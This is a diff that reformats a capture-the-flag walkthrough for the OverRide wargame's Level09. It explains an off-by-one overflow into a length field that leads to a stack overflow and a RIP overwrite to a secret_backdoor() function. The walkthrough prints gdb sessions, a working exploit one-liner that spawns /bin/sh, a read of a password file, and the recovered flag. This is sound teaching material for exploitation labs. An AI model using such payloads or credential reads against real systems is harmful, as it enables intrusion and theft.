@@ -1,10 +1,27 @@
+# OverRide — Level09 Walkthrough
+
+## Binary Analysis
+
+The program stores user input inside this structure:
+
+```c
 typedef struct s_message
 {
     char text[140];
     char username[40];
     int len;
 } t_message;
+```
 
+Important functions:
+
+- `set_username()` copies the username into `message->username`
+- `set_msg()` copies message data into `message->text` using `message->len`
+- `secret_backdoor()` executes a command with `system()`
+
+Decompiled code:
+
+```c
 void secret_backdoor() {
     char buffer[128];
 
@@ -59,53 +76,63 @@ int main() {
     handle_msg();
     return 0;
 }
+```
 
-the program ask for an username and a message with fgets and store them inside t_message struct.
+## Vulnerability
 
-we can see inside set_username that the loop that copy the given username inside t_message.username copy 41 bytes instead of 40. So we can overflow it, because its in a struct we know it will overflow inside the first byte of t_message.len. And t_message.len is used as len for strncpy inside set_msg hopefully if we set an high enought len we can overflow t_message.text on the rip(not eip cause we are in a 64bytes prog).
+In `set_username()`, the loop copies up to **41 bytes** (`i <= 0x28`) into a 40-byte field (`username[40]`).
 
-finding the rip offset from t_message.text
+That 1-byte overflow reaches the first byte of `message->len`, which is later used by `strncpy()` in `set_msg()`.
 
-so we need to use the username overflow to have a larger len and we gonna use buffer overflow pattern generator to find the offset
+By corrupting `len` (for example with `0xff`), `strncpy()` copies much more than 140 bytes into `message->text`, causing a stack overflow and control of `RIP`.
 
+## Finding the RIP Offset
+
+Run with a crafted username (to increase `len`) and a cyclic pattern as message:
+
+```bash
 (gdb) r < <(python -c 'print "a" * 40 + "\xff"'; cat)
-Starting program: /home/users/level09/level09 < <(python -c 'print "a" * 40 + "\xff"'; cat)
---------------------------------------------
-|   ~Welcome to l33t-m$n ~    v1337        |
---------------------------------------------
->: Enter your username
->>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
->>: >: Msg sent!
+```
 
+Crash result:
+
+```bash
 Program received signal SIGSEGV, Segmentation fault.
 0x0000555555554931 in handle_msg ()
 (gdb) info frame
 Stack level 0, frame at 0x7fffffffe5c8:
  rip = 0x555555554931 in handle_msg; saved rip 0x4138674137674136
- called by frame at 0x7fffffffe5d8
- Arglist at 0x6741356741346741, args:
- Locals at 0x6741356741346741, Previous frame's sp is 0x7fffffffe5d0
- Saved registers:
-  rip at 0x7fffffffe5c8
+```
 
-so with the saved rip (0x4138674137674136) we know our buffer is 200
+From the cyclic value in saved `RIP`, the offset is **200 bytes**.
 
-then we can build our exploit where we will overid rip with secret_backdoor addr.
-our program is build in PIE so to find the secret_backdoor addr we need to run the program with gdb then we can check the address (cause if we dont run program we only get relative addr)
+## Resolve `secret_backdoor()` Address (PIE)
 
+Because PIE is enabled, resolve the function address at runtime:
+
+```bash
 level09@OverRide:~$ gdb ./level09
 (gdb) b main
-Breakpoint 1 at 0xaac
 (gdb) r
 Starting program: /home/users/level09/level09
 Breakpoint 1, 0x0000555555554aac in main ()
 (gdb) info function
-All defined functions:
 ...
 0x000055555555488c  secret_backdoor
 ...
+```
 
+So runtime `secret_backdoor` address is `0x000055555555488c`.
+
+## Exploit Payload
+
+1. Username payload: 40 `'a'` + `"\xff"` (corrupt `len`)
+2. Message payload:
+   - 200 bytes padding
+   - overwrite `RIP` with `secret_backdoor`
+   - command string for backdoor (e.g. `/bin/sh`)
+
+```bash
 level09@OverRide:~$ (python -c 'print "a" * 40 + "\xff"'; python -c 'print "a" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "/bin/sh"'; cat) | ./level09
 --------------------------------------------
 |   ~Welcome to l33t-m$n ~    v1337        |
@@ -115,3 +142,10 @@ level09@OverRide:~$ (python -c 'print "a" * 40 + "\xff"'; python -c 'print "a" *
 >>: >: Msg sent!
 cat /home/users/end/.pass
 j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+```
+
+## Result
+
+Successfully redirected execution to `secret_backdoor()` and retrieved the final password:
+
+`j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE`
